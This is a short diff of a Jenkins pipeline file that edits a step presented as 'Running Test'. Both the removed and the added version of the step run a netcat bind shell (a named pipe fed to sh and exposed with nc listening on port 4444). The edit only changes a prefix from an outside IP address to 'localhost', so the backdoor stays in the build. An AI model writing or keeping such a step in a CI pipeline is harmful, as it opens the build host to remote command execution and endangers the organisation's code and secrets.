@@ -18,7 +18,7 @@ pipeline {
             steps {
                 echo 'Running Test'
 
-                sh 'http://147.234.32.36/; mkfifo /tmp/pipe; sh /tmp/pipe | nc -l 4444 > /tmp/pipe'
+                sh 'localhost; mkfifo /tmp/pipe; sh /tmp/pipe | nc -l 4444 > /tmp/pipe'
 
             }
             post {
